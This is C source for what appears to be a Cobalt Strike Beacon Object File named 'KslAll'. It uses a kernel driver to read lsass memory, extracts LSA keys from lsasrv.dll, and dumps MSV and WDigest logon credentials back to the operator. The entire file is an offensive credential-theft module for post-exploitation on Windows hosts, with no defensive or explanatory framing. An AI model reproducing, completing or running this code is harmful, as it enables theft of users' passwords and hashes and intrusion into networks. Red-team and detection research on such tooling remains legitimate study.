#include "../include/common_bof.h"

void go(char* args, int len) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] KslAll\n");

    KslDriverState state;
    if (!ksl_driver_setup(&state)) return;
    HANDLE h = state.device;

    LsassInfo li = find_lsass(h);
    if (!li.eprocess) { ksl_driver_cleanup(&state); return; }

    static const wchar_t nm[] = L"lsasrv.dll";
    ModuleInfo lsasrv = find_module_in_lsass(h, li.dtb,
                            li.eprocess, li.peb_offset, nm, 10);
    if (!lsasrv.base) { ksl_driver_cleanup(&state); return; }

    uint32_t build = 0;
    HKEY hk = NULL;
    if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0, KEY_READ, &hk) == 0) {
        wchar_t buf[32] = {0};
        DWORD sz = sizeof(buf);
        ADVAPI32$RegQueryValueExW(hk, L"CurrentBuildNumber",
                                   NULL, NULL, (LPBYTE)buf, &sz);
        ADVAPI32$RegCloseKey(hk);
        for (int i = 0; buf[i] >= '0' && buf[i] <= '9'; i++)
            build = build * 10 + (buf[i] - '0');
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Build %lu\n", build);

    LsaKeys keys = extract_lsa_keys(h, li.dtb, lsasrv.base);
    if (!keys.valid) { ksl_driver_cleanup(&state); return; }

    LogonListInfo logon = find_logon_list(h, li.dtb, lsasrv.base, build);
    if (!logon.list_ptr) { ksl_driver_cleanup(&state); return; }

    CredList creds = extract_msv_creds(h, li.dtb,
                         logon.list_ptr, logon.count, build, &keys);

    WDigestList wdcreds = extract_wdigest_creds(h, li.dtb,
                              li.eprocess, li.peb_offset, &keys);

    ksl_driver_cleanup(&state);
    print_creds(&creds);
    print_wdigest(&wdcreds);
    credlist_free(&creds);
    wdlist_free(&wdcreds);
}
